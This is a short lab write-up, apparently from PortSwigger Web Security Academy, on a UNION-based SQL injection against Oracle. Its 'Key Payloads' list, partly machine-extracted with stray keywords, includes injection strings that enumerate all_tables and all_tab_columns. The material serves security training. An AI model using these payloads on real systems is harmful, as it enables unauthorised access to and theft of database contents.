## SQL injection attack, listing the database contents on Oracle

**Category:** sqli
**Difficulty:** Unknown

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

### Solution Steps
On Oracle databases, every
SELECT
statement must specify a table to select
FROM
. If your
UNION SELECT
attack does not query from a table, you will still need to include the
FROM
keyword followed by a valid table name.
There is a built-in table on Oracle called
dual
which you can use for this purpose. For example:
UNION SELECT 'abc' FROM dual
For more information, see our
SQL injection cheat sheet
.

### Key Payloads
- `administrator`
- `SELECT`
- `FROM`
- `UNION SELECT`
- `dual`
- `UNION SELECT 'abc' FROM dual`
- `category`
- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
- `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: sqli

---
*Source: PortSwigger Web Security Academy*
